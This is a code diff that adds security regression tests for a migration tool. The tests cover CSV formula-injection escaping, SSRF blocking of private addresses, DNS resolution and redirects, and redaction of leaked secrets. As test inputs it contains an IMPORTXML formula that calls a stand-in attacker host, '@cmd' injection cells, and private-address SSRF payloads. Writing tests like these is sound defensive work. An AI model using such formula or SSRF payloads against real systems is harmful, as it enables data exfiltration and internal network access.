@@ -45,6 +45,10 @@ import {
   hydrateVaultCredentialReferences,
 } from '../server/apiMiddleware';
 import {
+  validateBaseUrl,
+  validateOutboundUrl,
+} from '../server/security';
+import {
   dashboardMigrationDraftContainsForbiddenKeys,
   sanitizeDashboardMigrationDraftForStorage,
 } from '../src/components/dashboardMigration/dashboardMigrationStorage';
@@ -66,6 +70,7 @@ import {
 import { DEFAULT_BRAND } from '../src/services/deckBuilder/types';
 import { OmniClient } from '../server/services/omniClient';
 import { sanitizeHistoryExportPayload } from '../src/services/historyExport';
+import { csvEscapeCell, csvRowsToText } from '../src/utils/csvExport';
 
 let tempDir = '';
 
@@ -107,6 +112,30 @@ test('api middleware preserves query params for handler requests while stripping
   assert.equal(webUrl.searchParams.get('folderPath'), 'just-for-fun');
   assert.equal(webUrl.searchParams.get('connectionId'), 'nfl-connection');
   assert.equal(webUrl.searchParams.get('includeModelDetails'), 'true');
+});
+
+test('CSV export helpers neutralize spreadsheet formula cells', () => {
+  assert.equal(csvEscapeCell('=IMPORTXML("https://evil.example")'), `"'=IMPORTXML(""https://evil.example"")"`);
+  assert.equal(csvEscapeCell(' +SUM(1,1)'), `"' +SUM(1,1)"`);
+  assert.equal(csvEscapeCell('-10'), `"'-10"`);
+  assert.equal(csvEscapeCell('@cmd'), `"'@cmd"`);
+  assert.equal(csvEscapeCell('safe, quoted'), '"safe, quoted"');
+  assert.equal(
+    csvRowsToText([['name', 'value'], ['Entity', '=1+1']]),
+    `"name","value"\n"Entity","'=1+1"`,
+  );
+});
+
+test('outbound URL validation blocks alternate private address forms and private DNS resolution', async () => {
+  assert.match(validateBaseUrl('https://2130706433') || '', /local or private/);
+  assert.match(validateBaseUrl('https://0177.0.0.1') || '', /local or private/);
+  assert.match(validateBaseUrl('https://[::ffff:127.0.0.1]') || '', /local or private/);
+
+  const dnsError = await validateOutboundUrl('https://omni-private.example.com/api/v1/folders', {
+    label: 'test URL',
+    resolveHost: async () => [{ address: '10.1.2.3' }],
+  });
+  assert.match(dnsError || '', /resolves to a local or private network address/);
 });
 
 function makeStoredJob(overrides: Partial<MigrationJob> = {}): MigrationJob {
@@ -855,6 +884,28 @@ test('migration job cancel works while vault is locked but retry still requires 
   assert.equal(retryResponse.status, 423);
 });
 
+test('migration job handler redacts secret-shaped immediate errors', async () => {
+  unlockVault('native passphrase');
+  const response = await migrationJobsHandler(new Request('http://127.0.0.1/api/migration-jobs/preview', {
+    method: 'POST',
+    body: JSON.stringify({
+      sourceId: 'omni_live_response_secret_123456',
+      documentIds: ['doc-1'],
+      targets: [{
+        id: 'target-1',
+        destinationInstanceId: 'dest-1',
+        targetConnectionId: 'connection-1',
+        targetModelId: 'model-1',
+      }],
+    }),
+  }));
+  const body = await response.json() as { error?: string };
+
+  assert.equal(response.status, 500);
+  assert.equal(JSON.stringify(body).includes('omni_live_response_secret_123456'), false);
+  assert.match(body.error || '', /\[redacted\]/);
+});
+
 test('migration job SSE item events redact bare errors without item payloads', () => {
   let received: MigrationJobEvent | null = null;
   const unsubscribe = subscribeMigrationJobEvents('redaction-event-job', (event) => {
@@ -934,6 +985,34 @@ test('post-migration actions block unsafe targets before network execution', asy
     (await runPostMigrationAction({ ...baseAction, url: 'https://evil.example/hook' })).error || '',
     /not allowlisted/,
   );
+});
+
+test('post-migration actions validate redirect targets before following them', async () => {
+  const originalFetch = globalThis.fetch;
+  const calls: string[] = [];
+  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
+    calls.push(String(input));
+    assert.equal(init?.redirect, 'manual');
+    return new Response('', {
+      status: 302,
+      headers: { location: 'https://127.0.0.1/internal-hook' },
+    });
+  }) as typeof fetch;
+
+  try {
+    const result = await runPostMigrationAction({
+      name: 'Redirect',
+      method: 'POST',
+      url: 'https://93.184.216.34/hook',
+      headers: {},
+      body: '',
+    });
+    assert.equal(result.ok, false);
+    assert.match(result.error || '', /Private-network/);
+    assert.deepEqual(calls, ['https://93.184.216.34/hook']);
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
 });
 
 test('instance save rejects unsafe post-migration webhook targets before vault persistence', async () => {
